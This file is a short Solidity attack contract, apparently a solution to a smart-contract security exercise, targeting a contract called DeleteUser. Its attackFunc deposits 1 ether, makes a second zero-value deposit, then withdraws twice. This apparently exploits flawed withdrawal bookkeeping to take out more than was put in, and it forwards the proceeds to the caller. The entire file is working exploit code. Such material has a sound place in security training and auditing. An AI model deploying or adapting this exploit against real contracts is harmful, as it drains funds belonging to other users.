pragma solidity 0.8.15;

import {DeleteUser} from "../DeleteUser.sol";

contract attacker {
    DeleteUser addr;

    constructor(address _addr) {
        addr = DeleteUser(_addr);
    }

    receive() external payable {}

    function attackFunc() external payable {
        addr.deposit{value: 1 ether}();
        addr.deposit();
        for(uint i = 0;i<2;i++) {
             addr.withdraw(1);
        }
       
        if (address(this).balance > 0) {
            (bool success, ) = msg.sender.call{value: address(this).balance}("");
            if (!success) {
                revert("not successful");
            }
        }
    }
}
